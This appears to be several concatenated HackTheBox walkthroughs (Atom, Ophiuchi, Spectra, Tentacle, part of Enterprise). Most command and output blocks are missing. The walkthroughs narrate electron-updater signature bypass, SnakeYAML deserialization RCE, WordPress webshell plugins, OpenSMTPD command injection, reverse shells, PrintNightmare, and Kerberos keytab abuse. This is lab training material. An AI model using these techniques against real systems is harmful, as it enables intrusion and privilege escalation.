Since there’s already a lot of themes around updates, electron-updater is interesting. At the top of the application, the logging for the updater is set:
At the bottom, it defines a bunch of actions and then calls checkForUpdates():
In the resources directory there’s also a app-update.yml:
I’ll add updates.atom.htb (and atom.htb) to my /etc/hosts file.
I could find the same information using a Windows VM. If I run the binary, the Heed application pops up:
“Error in auto-updater.” at the bottom right is interesting. If I fire up Wireshark and open Heed again, the immediate issue becomes apparent:
The term “auto-updater” is hyphenated in such a way that it looks like it might be a proper name. Doing the same kind of analysis on the archive that I did above on Linux, I can determine that this is an electron application, and that on it’s own is enough to move to the next step. Still, I could add that IP to my hosts file at c:\windows\system32\drivers\etc\hosts:
On closing and re-opening Heed, there’s a failed GET request to Atom for latest.yml:

Category: Shell as jason
Via enumeration in either OS, I’ll have terms like “electron-updater” or “latest.yml auto-updater exploit”, and these terms interesting stuff in Google:
The same links come up with the terms identified in the windows analysis.
This post gives a good breakdown of the vulnerability and exploit, as well as some background:
During a software update, the application will request a file named latest.yml from the update server, which contains the definition of the new release - including the binary filename and hashes.
The idea is that I can bypass any signature checks on updates by breaking the script that manages that, specifically by putting a ' in the filename. The example file they give is:
There’s also a command injection vuln that looks like:
I’ll show two ways to do this, both very similar, but first by uploading the payload, and then serving it over HTTP.
This tracks with how the article shows the update and the latest.yml.
I’ll build an executable that will provide a reverse shell using msfvenom:
The latest.yml file needs a base64 SHA512, which is easy to calculate using the example in the post:
All of that goes into the latest.yml file:
The url is the binary name with a ' in it to break validation. I set the size to the correct size, but it doesn’t matter. Same thing with releaseDate, which can be any valid date string, or just omitted. One thing that cost me a ton of time - the example in the post has invalid spacing! sha512 and size should be lined up with url, not with -.
I’ll upload the latest.yml and the binary to one of the client folders, making sure to update the name of rev.exe to r'ev.exe to match what’s in the latest.yml:
Within a minute, there’s a shell at the listening nc:
There’s no shell upgrade in Windows, but I do use rlwrap to get access to the arrow keys. If you prefer PowerShell to Cmd, you can run powershell to get that prompt.
user.txt is also now available:
When helping a friend with Atom later, I noticed that the field was url, and while I was putting a local file next to latest.yml on the server, it seems logical that exploit also works with the payload remotely. I’ll create another YAML file:
The only thing I changed is the url is now pointing at my host. I’ll upload this to Atom:
Each minute, there are two connections to my webserver:
If I put the payload there:
Then it still doesn’t find r'ev.exe.blockmap, but it does find r'ev.exe (see the 200 status code):
And it runs, as a reverse shell connects back:
Interestingly, when the request for the .exe file was 404, Atom would hit the web server every minute. It seems like perhaps that attempting to get a file but not finding it would break the process such that the cleanup on Atom didn’t continue. Once I put an executable there, everything was cleaned up.

Category: Shell as administrator
In Jason’s Downloads directory, there are two folders:
node_modules is almost certainly related to the Heed application, but PortableKanban is not. Googling for “portablekanban”, the first hit is an ExploitDB post, just before the link to the actual software:
The post is a Python script, which I also looked at in detail for Sharp:
It looks like the creds are just base64-decoded, and then decrypted using DES with a key of “7ly6UznJ” and an IV of “XuVUm5fR”.
In Sharp, there was a local config file to decrypt. Unfortunately, I don’t see a PortableKanban.pk3 file on Atom:
PortableKanban.pk3.lock has potential, but where the script loads the json and looks for the users key, there is no users key in this file:
The config file is a giant JSON blob:
Right at the front is this part (whitespace added):
The program is using Redis rather than local storage, and there is a Redis server on this host!
I suspect I could try to decrypt that password stored in the PortableKanban config, but looking around in the Redis directory, there’s a config there as well, and printing it (using select-string to remove comments and then remove blank lines):
The first line has the password.
Now with that password, I can access Redis:
The third key there has the administrator’s information, including the encrypted password:
The script shows the key and IV for the DES decryption. CyberChef will take care of this very quickly:
Alternatively, it’s not a big jump to modify the Python script from the exploit to something like:
It no longer needs the JSON parsing, just take the encpryted password and decrypt it (I renamed the decode function to decrypt, but didn’t change anything else about it). It works:
With this password associated with the administrator username, my first thought is to see if it can be used for WinRM. crackmapexec says yes:
Evil-WinRM works to get a shell:
And the flag:
Atom is vulnerable to CVE-2021-34527, or PrintNightmare. I show various POCs in this post, but I can show it quickly here as well.
I’ll catch the shell as jason from the Electron exploit, and switch to PowerShell:
I’ll start a webserver in the Invoke-Nightmare directory on my host:
If I try to upload a copy and load it, Windows blocks that:
However, I can just Invoke-Expression (or iex) the code. I can do so right from the webserver:
Or from the local copy:
Either way, the code is now loaded. Now I can run it to add a user:
With admin priv, I can PSExec to get remote execution as SYSTEM:
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 13 Feb 2021
OS : Linux
Base Points : Medium [30]
Nmap scan:
Host is up (0.11s latency).
Not shown: 58706 closed ports, 6827 filtered ports
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxyCategory: Recon
nmap found two open TCP ports, SSH (22) and HTTP (8080):
Based on the OpenSSH version, the host is likely running Ubuntu 20.04 Focal. The server is Tomcat, so I can expect a Java-based site.
The page is an online YAML parser:
The need support link just leads back to this page.
Adding any text and clicking parse leads to an error message:
Due to security reason this feature has been temporarily on hold. We will soon fix the issue!
I’ll run gobuster against the site, and include -x php since I know the site is PHP:
/manager is the Tomcat manager page, which needs creds, and the defaults don’t work.
/test redirects to /test/ which is 404.

Category: Shell as tomcat
YAML parsers are notoriously bad with safely handling data serialized data. Thinking about what the site is (or will be?) doing with input, it will try to parse the YAML into objects, which is deserialization.
Despite the site saying it’s down, it’s not clear if that is displayed before or after trying to deserialize the user input. I’ll try a YAML derserialization payload just to check. Since the server is Tomcat, I’ll look for Java-based payloads. In Googling “Java YAML deserialization”, there are a handful of blog posts about the topic. This post has a nice test to see if Java Yaml deserialization would work, which when adapted for Ophiuchi becomes:
I’ll start a Python webserver and put that into the form. On submitting, there’s a request:
This means the POC worked.
The blog post now writes some Java code which it compiles into a .class file, and generates a folder structure for this request. I had a bit of a struggle getting that to work. I created the /META-INF/services/javax.script.ScriptEngineFactory file and the compiled Class file. Ophiuchi would read that and then request the class file, but then it would crash the page and not show any evidence of executing my code.
Some Googling led to this marshalsec repo for all kinds of Java-based deserialization attacks, and then the yaml-payload repo, which focuses on this specific SnakeYAML deserialization attack. The payload looks exactly the same, but they put it into a JAR for loading. The YAML part now tries to load a JAR file instead of a URL path:
Sending that now just requests the single file, and not the META-INF path:
I’ll clone the yaml-payload repo to my VM and copy the src folder into my folder for this box:
I’ll change to src/artsploit/AwesomeScriptEngineFactory file to include a ping to my VM:
Now compile that code, and then put it into a JAR:
The resulting JAR file has a similar structure as was being requested across multiple requests in the first attempt:
I’ll move ping.jar into my directory hosted by the Python webserver, and send the payload:
First it’s requested from the HTTP server (twice for some reason):
Then it pings my VM:
That’s RCE.
Getting a reverse shell from here wasn’t trivial. I think this is typically of Java. I tried several Java reverse shells, and putting typical Bash and nc based shells into the Runtime.getRuntime().exec(). Nothing worked.
Stepping back, I tried just putting nc 10.10.14.7 443 into Runtime.getRuntime().exec(), and it connected back. So it isn’t a firewall, but rather something about how Java is running the reverse shells. What about curl? I’ll modify the Java source to issues curl http://10.10.14.7, recompile / re-Jar, and trigger, and it works:
I’ve run into this before. Java has issues when you include pipes or redirects in the execution payloads. The best way around this is to do it in steps:
This can be done in one JAR payload:
I’ll compile, Jar, and move it into www:
The payload is:
There’s three requests at the Python HTTP server, two for the Jar, and then for the shell:
Then there’s a shell at listening nc:
I’ll upgrade my shell with the standard Python trick:

Category: Shell as admin
There’s one real user on the box, admin, and their home directory has user.txt, but I can’t read it as tomcat:
As the tomcat user, the current home directory is /opt/tomcat:
/opt/tomcat/conf/tomcat-users.xml has the username and password for Tomcat:
The username here matches the username from the host. I’ll see if the password is reused. It is:
I can also connect over SSH:
And grab user.txt:

Category: Shell as root
sudo -l shows that admin can run a specific Go program as root:
The index.go program reads in main.wasm and uses it to create a new wasm instance:
Then it runs a function, info from that instance and checks the result. If the return is not 1, then it prints “Not ready to deploy”. Otherwise, it prints “Ready to deploy” and runs deploy.sh, which is empty at this point:
If I try to run this from /home/admin, it returns a bunch of errors:
These error messages are not great, but it’s because it’s trying to read main.wasm from the current directory, and failing because it’s not there. If I go into the directory where the files are, it runs fine:
Based on the output above, main.wasm is clearly returning a non-1 value, so it’s time to look at that.
WASM, or Web Assembly, is a binary instruction format for a stack-based virtual machine designed to run cross-platform. The main purpose for WASM is to have fast and high performance applications on webpages, but it can run in other environments as well.
I’ll copy main.wasm back to my VM using scp:
Googling for WASM disassembler, the first result is The WebAssembly Binary Toolkit, or WABT. I’ll build the tools by cloning the repo to my machine, and then running the make script:
This will require cmake (apt install cmake) to run. Now I have different binaries to read the WebAssembly. wasm2wat will convert main.wasm into WebAssembly text format (from the binary format):
That wasn’t totally clear to me. wasm-decompile was much cleaner:
The function info returns 0.
Because the Go program isn’t using absolute paths, I can control both main.wasm and deploy.sh. I’ll write a main.wasm that returns 1, and a deploy.sh that gives a shell.
I recently looked at WASM for RopeTwo, where my V8 payload used WASM to create a binary space in memory that was executable. That payload was just a silly function that returned 42, and then I overwrite that memory with my shellcode and call it. That didn’t require much WASM knowledge or even understanding, but I did learn about WasmFidle. It allows me to put in some simple C code and generate Wasm.
In fact, the default code (which just returns 42) will solve my issue here. I’ll hit the “Build” button to generate the Wasm (shown on the bottom left). Now I can run it and it will print 42 (bottom right).
I’ll change the name of the function from main to info, change 42 to 1, and then Build again. If I want to run it, I need to change the call in the JS on the top right, but I don’t need to run it. There are two download buttons. “Wat” is the text version, and “Wasm” is the binary. I’ll take the binary.
I’ll copy the new Wasm into /dev/shm:
I’ll also create deploy.sh that will create a .ssh directory for the root user if it doesn’t exist, and then write my public SSH key into authorized_keys:
Now I’ll run it:
Now I can connect as root:
And grab the flag:
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 27 Feb 2021
OS : Chrome
Base Points : Easy [20]
Nmap scan:
Host is up (0.085s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysqlCategory: Recon
nmap found three open TCP ports, SSH (22), HTTP (80), and MySQL (3306):
NGINX versions are not as nicely correlated to OS, and the OpenSSH version is not one I recognize, which fits the Other OS category from HTB.
The webpage is pretty plain, with just some text and two links:
Both links reference spectra.htb, so I’ll add it to my local /etc/hosts file:
I did run a wfuzz to look for any subdomains, but didn’t find any.
The second link leads to http://spectra.htb/testing/index.php which just displays an error:
Looking at the url without index.php, instead of just loading index.php, it gives a directory listing:
Most of the files are PHP and standard WordPress files. wp-config.php is where the database username and password will be stored, but clicking on it will just run the PHP on the background and return an empty page. However, there’s another file, wp-config.php.save. .save files are created by nano (docs):
In some cases nano will try to dump the buffer into an emergency file. This will happen mainly if nano receives a SIGHUP or SIGTERM or runs out of memory. It will write the buffer into a file named nano.save if the buffer didn’t have a name already, or will add a “.save” suffix to the current filename. If an emergency file with that name already exists in the current directory, it will add “.save” plus a number (e.g. “.save.1”) to the current filename in order to make it unique. In multibuffer mode, nano will write all the open buffers to their respective emergency files.
Clicking on it returns a blank page, but viewing the source (Ctrl-u, or fetching the page with curl) gives the text:
There’s more than that, but the interesting part is the DB connection information.
I did try to connect to 3306 using mysql, but it is configured to not allow connections from my IP:
I’ll note the username and password.
The site is titled Software Issue Management, and it is clearly a WordPress site:
There is one user noted on the page as the author of the “Hello world!” post, administrator.
I’ll run wpscan against the host with wpscan --url http://spectra.htb/main -e ap,t,tt,u --api-token $WPSCAN_API. I’ve signed up for a free-tier API token from wpscan.com to get detailed vulnerability results in the scan, and I’ve saved it by adding export WPSCAN_API=pOP7AM... to my ~/.bashrc script.
The scan didn’t find much of interest. It did confirm the administrator username.

Category: Shell as nginx
Clicking the Login link on the WP page leads to a standard WordPress login page:
The username devtest doesn’t seem to exist:
But using the password “devteam01” with the administrator user does:
There are many ways to try to go from admin login on WP to code execution. The first one I tried was to edit a theme to include a webshell. Under Appearance -> Theme Editor I get access to all the theme pages. I loaded 404 Template, and added a check to the top of the page:
When I save this, I can go to /main/wp-content/themes/twentytwenty/404.php to trigger it. However, when I try to save, it fails:
This is a protection put in place to stop people from doing exactly what I’m trying to do.
On the Plugins tab, there are two existing plugins:
I’ll click on the Plugin Editor (in the menu on the left), and it takes me to the editor with Akismet Anti-Spam loaded and akismet.php in the editor:
I can find this plugin at [WP root]/wp-content/plugins/[plugin name]/[filename]:
I’ll add a bit of code at the top to make it a webshell only if the parameter 0xdf is there:
It works:
Alternatively, I could just write my own plugin. There are tools like Wordpwn that will generate one, or a Metasploit module that will do it, but for the sake of showing how things work under the hood, I’ll create one from scratch. A WordPress plugin can be as simple as a PHP script with some basic comments at the front in a zip file.
I’ll create the webshell and name it 0xdf.php:
The comments are necessary for WordPress to accept it as a plugin. Now I’ll add that to a zip file:
Under Plugins -> Add New, I’ll click the Upload Plugin button and find the zip:
When I hit Install Now, it reports success:
I don’t need to hit Activate, as installing is enough to drop the file at the right path. Now I can use curl or Firefox to execute commands:
With either webshell, getting a shell is as simple as passing it a reverse shell. I like to use curl so it’s repeatable.
It doesn’t look like nc is on the host, so that eliminates several command reverse shells. I got the Python one to work:
At nc:
I’ll upgrade my shell:

Category: Shell as katie
/etc/lsb-release solves the mystery about the OS:
It’s Chrome!
There are several home directories in /home:
I didn’t find much interesting in there, but I can’t access katie or root.
In the /opt directory, there’s an interesting file, autologin.conf.orig:
This is a script that’s started on boot completion:
It checks in two paths for a passwd file, and if either is there, it breaks, and then runs inject-keys.py -s $passwd -k enter. inject-keys.py looks to be this script from the Chrome-ec repo, and it does what it says. Of the two paths, the first doesn’t exist, but the second does:
It contains what looks like a password:
There are four users in /etc/passwd that don’t have a shell of /bin/false:
I’ll create a file with those users and run crackmapexec to check for SSH with that password:
It worked for katie!
I can connect as katie over SSH:
And I can get user.txt:

Category: Shell as root
katie has sudo rights on initctl:
initctl “allows a system administrator to communicate and interact with the Upstart init(8) daemon.” More on that in a minute.
katie is also a member of the developers group:
That provides access to a handful of files that were previously unaccessible:
The .conf files are all the same:
They each contain a similar structure that includes script blocks:
The node .js script contains a NodeJs script to start a simple Hello World style webserver:
The initctl man page gives a handful of options, like start, stop, restart, and list.
As I can edit these .conf files, I’ll add a line to the script section:
The service is currently stopped (and it looks like the box is regularly resetting the conf files and stopping the test services):
I’ll start it:
Now there’s a file in /tmp:
The service runs my added code as root.
To get a shell, I’ll replace the id line with the same reverse shell I used earlier:
Now I’ll start the service:
And get a shell as root:
And root.txt:
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 23 Jan 2021
OS : Linux
Base Points : Hard [40]
Nmap scan:
Host is up (0.18s latency).
Not shown: 65530 filtered ports
PORT     STATE  SERVICE
22/tcp   open   ssh
53/tcp   open   domain
88/tcp   open   kerberos-sec
3128/tcp open   squid-http
9090/tcp closed zeus-adminCategory: Recon
nmap found four open TCP ports, SSH (22), DNS (53), Kerberos (88), and Squid (3128):
The Bind DNS version is suggesting this is RedHat Linux 8.  There’s also a hostname, realcorp.htb.
nmap also noted that 9090 was closed, which nmap is smart enough to identify is different from the rest of the ports which return filtered. For example:
In Wireshark, that looks like:
The packets up through 0.252 seconds are nmap trying to see if the host is up with a ping and requests to 80 and 443. Then at 0.93, it sends SYN packets to the five ports I requested. 9090 sends back a RST (reset)  / ACK (acknowledge) packet, which indicates the port is closed. For the other four hosts, Tentacle sends back an ICMP Destination Unreachable message, which nmap reports as filtered.
I’ll keep an eye out for ways that I might interact with 9090 in a different way, as it is behaving differently from the rest of the ports I can’t interact with (though it turns out to be nothing).
I generally start a UDP scan in the background, but I’m especially keen to given the presence of DNS on TCP, which suggests it’s likely listening on UDP as well. This scan took forever, but did return three open ports, DNS (53), Kerberos (88), and NTP (123):
Any time there’s TCP DNS, it’s worth trying to do a zone transfer, which is a query that, if enabled, would return all the domains the DNS server knows about associated with a given domain. I can try with and without the domain I found above, realcorp.htb, but neither return anything:
I checked tentacle.htb on a bit of a whim, but no info there either.
Just asking the server what for records associated with realcorp.htb, it returns a SOA record that includes root.realcorp.htb:
Even though the DNS server doesn’t return IPs for either domain, in the HTB world, those probably both associate with the host IP, so I’ll add them to my /etc/hosts file for now.
dnsenum will brute force subdomains over DNS. This is similar to how I might brute force subdomains using wfuzz or fuff looking for virtual hosts in a webserver, but this time it’s trying to resolve DNS subdomains and seeing if any come back with records. This takes a while, so I’ll run it in the background while looking at other things:
It finds three more subdomains. These each have their own IP addresses. It’s not clear exactly what they mean, and if they are legit IPs in use or if they are relics of the environment that the box author created the box in. It is definitely true that wpad has a different IP from ns/proxy.
Alternatively, nmap has a -sL option, which will do host identification over DNS (it will print a line for each host, so I’ll grep on ( which is where a reverse resolution came back). It finds the same hosts:
I need to give it the DNS server to look at (Tentacle), or else it will use the system resolver and find nothing.
I could also manually do the same thing with dig and the -x flag to do a reverse lookup by IP. The second answer in this post gives nice syntax for getting a one line answer:
I’ll loop over the rest of the class C, but there are no additional hosts:
Without a user or creds, all I can really get from Kerberos is a test of if a user exists in the domain. I’ll use kerbrute in userenum mode. I tried a couple different wordlists, but didn’t find anything:
HackTricks has a page on Pentesting NTP. I couldn’t get any of the ntpq commands to respond, but the nmap script did give the current time on the box:
I could also get that offset from ntpdate:
The first line is the output of date, the time on my local host. The next two come from ntpdate. On the last line, it prints my host’s time, as well as the offset to the time on Tentacle, which is about three minutes (183 seconds)  ahead of my host.
Not much else I can expect from NTP.
I attempted to set up the Squid in FoxyProxy the way I did in Unbalanced and Joker. For some reason, on trying to request http://10.10.10.224, Firefox would just hang. Looking at the stream in Wireshark, first Firefox issues a CONNECT request:
The response is a 407 Proxy Authentication Required:
I’ll save the HTML that comes back as a file and open it in Firefox:
The resulting page has some useful info:
The cache administrator’s email is j.nakazawa@realcorp.htb. The hostname at the bottom is srv01.realcorp.htb.
If I do the exact same thing, but request http://127.0.0.1 instead of http://10.10.10.224, there’s actually a different error:
The first time it said the request was unauthorized, but this time it says the connection failed. This implies that the requirement for authentication may not apply to localhost.
With the username, I can try to get a hash off of Kerberos using GetNPUsers.py. This will return a hash if the UF_DONT_REQUIRE_PREAUTH flag is set for the user. It works:
This type of hash isn’t implemented in hashcat yet, but john will give it a run:
It doesn’t crack with anything in rockyou.txt, so it’s likely not the way.
I wanted to try scanning through the proxy. I create a proxychains config that would route through the Squid:
It took a bit of playing with nmap to get it to work. I worked without disabling the proxychains messages so I could troubleshoot, and just with the top ten ports until I got something working like this:
-sT will do a full TCP connect scan, rather than the default -sS SYN scan. A SYN scan won’t work here because the proxy isn’t passing the TCP handshake packets back to my VM, so a SYN scan, which sends the SYN packet, sees the ACK, and then ends the connection, won’t be passed back over the proxy. -Pn also necessary because the typical host detection nmap does involves sending ICMP and TCP on 80 and 443. ICMP won’t go over the proxy, and 80 and 443 are likely not open, so it just returns that the host is down. -Pn tells nmap to continue scanning without that check.
Typically a Squid proxy limits what it will forward through, but that fact that I was able to scan SSH suggests this is a non-default config. I’ll scan the top 1000 ports (and add -q to proxychains so I don’t see every failed connection):
It looks very similar to what I could see from the outside. Two new ports, 464 and 749, but not much I can do with those. It is interesting to note that I can connect to 3128.
I did try explicitly scanning port 9090, but it’s still closed:
I tried scanning the other two IPs from the DNS results, but both failed:
I already noticed above that there was a different going to 10.10.10.224 vs localhost. What if I can nest proxies, first going through 10.10.10.224:3128 and then through 127.0.0.1:3128. That would leave the traffic as if it’s coming from Tentacle, and as I noted above, I’m able to connect to 3128. I’ll create another proxychains config, proxy-squid-x2.conf:
strict_chain means that it will only work if it goes through each of the proxies in the list. I’ll scan again with ten ports to check:
The proxychains output for the one port open, 22, shows it’s going through the Squid twice:
The 1000 port scan of 127.0.0.1 looked the same.
But, when I scanned the other two IPs, it was able to connect to 10.197.243.77 (where it didn’t through just one layer of proxy). 10.197.243.77 has the same ports as 10.10.10.224:
10.197.243.77 was named proxy.realcorp.htb and ns.realcorp.htb. If it’s a proxy, maybe it’s some kind of gateway into the internal network. proxy-squid-x3.conf:
This will bounce through three proxies on the way to the target. I’ll try scanning 10.197.243.31 again. First with loud proxychains and just ten ports to make sure it’s working like I would expect:
Looking at the proxychains output, it’s clearly routing through 10.10.10.224 –> 127.0.0.1 (10.10.10.224 again) –> 10.197.243.77 –> 10.197.243.31. That’s neat. And now there are different ports open on 10.197.243.31:
Squid seems to be running on 10.197.243.31 as well, but I’m out of targets to proxy to. But, 80 is open on this host, and it is named wpad.realcorp.htb. WPAD, or Web Proxy Auto-Discovery Protocol is a way for clients to automatically find and use a proxy configuration file. The client gets the WPAD URL either using DHCP or DNS.
For DNS lookups, the path of the configuration file is always wpad.dat. For the DHCP protocol, any URL is usable. For traditional reasons, PAC files are often called proxy.pac (of course, files with this name will be ignored by the WPAD DNS search).
Given that there’s a wpad.realcorp.htb domain, it seems like DNS maybe being used, and TCP 80 is open on that host. Getting the root by IP returns a default test page:
However, trying it with the domain name returns a 403:
So there’s virtual host routing enabled on the WPAD server. I could wfuzz or fuff to find additional subdomains, but I won’t need to. I don’t need to worry about resolving wpad.realcorp.htb (like putting it in /etc/hosts) as that’s done at the internal proxy server that’s sending the actual HTTP request.
There is a wpad.dat file in the web root:
I’ll try the same DNS tricks from above to look for hosts in the new class-C. nmap finds one:
dig finds the same host:
Both the one hop and two hop proxychains configs don’t return anything, but the three hop config finds a single open port (in the top 1000):
Safe scripts and version scans show it’s running OpenSMTPD:

Category: Shell as root on smtp
Googling for “opensmtpd exploit” returns a remote code execution exploit from Exploit-DB, CVE-2020-7247. It’s a Python script, but looking at it, it looks like a simple command injection in the MAIL FROM line. It connects to the server, and then reads the Hello string:
It sends a HELO response:
It sends the payload:
Then it sends the rest of the fields and exits:
To test this, I’ll use nc to try to ping my VM from the SMTP server. I’ll start tcpdump listening for ICMP, and then connect to the port:
I’ll enter HELO and then the payload in the MAIL FROM:
Next I need to enter the rest of the fields. But it fails on trying to send to root:
Luckily I had an email address from the Squid pages:
Now the data. The top blank line is important, and then whatever I want leading up to a line with just a .:
When it prints “Message accepted for delivery”, ICMP packets arrive at tcpdump:
I’ll enter QUIT to exit:
To save myself the trouble of typing all that, I’ll grab the exploit and replace root with j.nakazawa@realcorp.htb. It runs:
And produces the same result:
After futzing with different reverse shells for a while, I went back to just requesting a shell and then passing it to Bash. curl didn’t reach back to my host, but wget did. I wrote a simple shell.sh:
I’ll start a Python web server and nc on 443. Now wget will get it and save it in /dev/shm, and then run it:
First there’s a request at the webserver:
Then a shell:
Python isn’t installed on the box, but I can use script:

Category: Shell as j.nakazawa on srv01
I’m already root on this host, but there isn’t anything interesting in /root/:
On this host, there’s one user, and not many files:
.msmtprc is the only unusual file. It’s a config file for a lightweight SMTP client, and can often include credentials. In this case, it does:
I tried to SSH using those creds into the different hosts without success:
Given how unusual it is to see Kerberos on Linux (at least on HTB), it’s worth poking at that. I’ll install a client, sudo apt install krb5-user.
The command to get a ticket is kinit. Running it with no args tries to get a ticket as oxdf@ATHENA.MIT.EDU:
If I pass it a “principle name”, it’s still trying that domain, and giving the domain throws errors:
I’ll need to update /etc/krb5.conf. The current default version is set up for MIT:
I’ll delete the current file and replace it with:
Now when I do kinit, it prompts for a password:
On entering the password above, it just returns without message, which is good (entering a bad password throws an error). Running klist shows there’s a ticket on my system:
Kerberos can be very picky about DNS names. I found that SSH would fail if I didn’t have srv01.realcorp.htb as the first host for the IP 10.10.10.224 (some troubleshooting with -vv on ssh helped me figure that out):
With that in place, I can SSH into the box using the Kerberos ticket:
Running that ssh with -v, it shows where it tries gssapi-with-mic, which is the method that uses Kerberos tickets to authenticate:
From this shell, I can grab user.txt:

Category: Shell as admin on srv01
There’s on additional user on this host, admin:
/etc/crontab shows an interesting job running as admin every minute:
The script is owned by root with the admin group
The . at the end of the permissions means that it has an SELinux context, but no additional rules (ACLs), as getfacl shows in detail:
j.nakazawa can read the script:
This script is using rsync to copy all the files from /var/log/squid/ to /home/admin/, then create an archive using tar, and clean up.
An interesting feature of Kerberos on Linux is the .k5login file. This file in a user’s homedir lists different Kerberos principals (basically users) that can authenticate with their tickets to get access as the user. This is kind of like the authorized_keys file for Kerberos. So if admin had a .k5login file in their homedir with the name j.nakazawa in it, then anyone with a Kerberos ticket for j.nakazawa could SSH as admin.
I can put that .k5login file in place abusing the backup script if I can write to /var/log/squid. It looks like only admin and members of the squid group can write:
j.nakazawa is in the squid group:
I’ll write a simple .k5login file:
Once the next cron triggers, I can auth as admin using SSH:

Category: Shell as root
I’ll use find to identify files in owned by the admin user:
I’m using grep to get rid of things starting with /sys, /run, and /proc because those aren’t interesting. The logs archive is created by the cron (there must be something clearing those periodically). The mail file could be interesting, but it’s zero bytes:
The admin user is in the admin and squid groups:
Doing the same thing to find files in associated with the admin group, there are two additional files:
I already knew about the log_backup.sh script. I’ll focus on /etc/krb5.keytab.
The Keytab file is required on all Kerberos server machines, and is used to authenticate to the KDC. The documentation, after using two sentence two define the file, spends the next two talking about how important it is to protect:
All Kerberos server machines need a keytab file, called /etc/krb5.keytab, to authenticate to the KDC.  The keytab file is an encrypted, local, on-disk copy of the host’s key.  The keytab file, like the stash file (Create the Database) is a potential point-of-entry for a break-in, and if compromised, would allow unrestricted access to its host.  The keytab file should be readable only by root, and should exist only on the machine’s local disk.  The file should not be part of any backup of the machine, unless access to the backup data is secured as tightly as access to the machine’s root password itself.
The file itself is binary, but klist -k will list the principles in the keytab file (I’m not sure why each shows up five times, but I have a guess from my work in Beyond Root):
By default, a krb5.keytab file would only have the host principle. But another principle, kadmin, has been added here with both the admin and changepw privileges. That means that anyone who can read this file can act as kadmin, and that user can run the kadmin binary which allows them to administer the Kerberos domain. Running it will drop me to a kadmin prompt:
It’s important to specify that I’m getting auth through the keytab file, and that I want to enter as the kadmin principle with admin privs.
From within kadmin, I can list the users (principles) in the domain:
I can add root as a principle. When prompted, I enter a password (twice), and then root shows up:
Now ksu will run su using Kerberos, so I’ll enter the password I just created for root:
And grab root.txt:
The call to kadmin to then add a principal can be done in one line as well:
I looked for ways to dump hashes or passwords from the keytab file, but didn’t make much progress. I found this tool, but it’s in legacy Python, and only gives one key:
This one is a bit nicer, and in Python3, but still only shows the host key:
On diving into the binary format, I think I can explain why the parsers are stopping after the host.
IppSec and I spent a bit of time trying to figure out the binary format, and this reference proved to be the most useful (though not entirely complete).
The keytab is made up of a version and then some number of keytab_entry:
Each keytab_entry starts with a four byte size. Looking at the file in xxd on my computer, that looks about right:
I show each keytab_entry in a different color, after the version in red at the top. Each starts with a four byte size (0x5b, 0x4b, and 0x4d were observed above). There is an oddity at the end where the next keytab_entry would have a size of 0xffffffc3, which would be 4292967235 or -60. I’ll come back to those. After that size and a block of 00, it continues with the expected format.
Looking at each keytab_entry, they have the following structure:
Each block starts with a four byte size (blue), then a two byte number of components (yellow), which is always two. Then a counted_octect_string realm (pink), which is defined as:
So each time there’s a string of data (I’d call it a buffer), it’s a two byte length and then the data. For any counted_octet_string, the length is in blue. Next come the components (green), each of which are counted_octet_string.
Next comes the four byte name_type (orange), which the docs say is practically always almost 1 for KRB5_NT_PRINCIPAL, and that’s the case here. Then a timestamp (purple), which is four bytes and number of seconds since 1/1/1970. So 0x5fcffb02 becomes 1607465730 which translates to Tue, 08 Dec 2020 22:15:30 GMT (which matches the timestamp from klist above). The version number shows up as one byte next, and then again optionally at the end as four bytes (both white).
What’s left is the keyblock objects. Each is a two byte type, and then another counted_octect_string (so len and then buffer). The first keyblock looks like:
This one is keytype 0x12 == 18 == aes256-cts-hmac-sha1-96. The other keytypes are 0x11 == 17 == aes128-cts-hmac-sha196, 0x17 == 23 == rc4-hmac (NTLM), etc. These are what came out of the parsing tool above.
Presumable we could try to crack these and get passwords for these principles.
The only thing I can’t explain at this point is the blocks of 0s proceeded by ffffc3 where the next length should be:
Where there should be a length, there’s a negative sixty (0xffffffc3), followed by 0x3d (61) zeros. But if I allow that a length of -61 means jump forward 61 0s, I the rest of the file parses as expected. The parsing scripts don’t have anything in them to handle this, so they read this as a large number and exit. I suspect that’s why they don’t find all the keys.
CTF solutions, malware analysis, home lab development

Difficulty Rating:
Release Date : 28 Oct 2017
OS : Linux
Base Points : Medium [30]
Nmap scan:
Host is up (0.16s latency).
Not shown: 65305 filtered ports, 226 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
8080/tcp open  http-proxyCategory: Recon
nmap found four open TCP ports, SSH (22) and HTTP (X):
The OpenSSH and Apache versions are all mixed up. OpenSSH is version 7.4p1 Ubuntu 10, but that’s not a default version on Ubuntu, but it is on Debian stretch. Likewise, TCP 80 and 8080 are showing Apache/2.4.10 Debian, which is the default on Debian Jessie. The HTTPS site (443) is showing a version string that matches the default on Debian stretch, but also says Ubuntu in the output.
It’s not clear what OS Enterprise is, other than it is likely multiple, via some kind of virtualization, likely Docker.
Visiting http://10.10.10.61 returns a page that doesn’t look right, as if the CSS isn’t loading:
The page source shows a bunch of references to enterprise.htb, and that it’s WordPress:
I’ll add the domain name to /etc/hosts, and then it loads nicely:
The texts of the posts isn’t too interesting, but I can pull user names off the posts:
All of the posts are by william.riker.
Rather than brute force the WP side, I’ll run wpscan (using the free API key I got from their site):
There’s a ton of output, but I’ll show the highlights.
There are 51 vulnerabilities identified, which makes sense for an old WP site (looking back later at IppSec’s scan, there were 14 at the time Enterprise retired). Still, none are that interesting. There’s a $wpdb->prepare() potential SQLi, but that almost never works without the right plugins. I don’t care about denial of service or open redirects, and I don’t really care about XSS unless I have some indication that there’s a simulated user on the box.
wpscan didn’t find any known plugins or Timthumbs.
It only finds the one user identified above:
The site over HTTPS is just the Apache2 Ubuntu default page:
Looking at the TLS certificate, there’s the name enterprise.local, as well as another user:
I added enterprise.local to /etc/hosts, but neither of the domains returned anything but the default page over 443.
I’ll run feroxbuster against the site:
It found one interesting path, /files.
Directory listing is on, and there’s a Zip archive there:
The site is another Star-Trek-related blog:
Looking at the page source, it’s Joomla:
I didn’t find much here, and couldn’t log in.
I can connect to this port with nc, and it responds:
Anything I guessed just returned Invalid Code:
I’ll have to come back to this.
The zip file has three files in it:
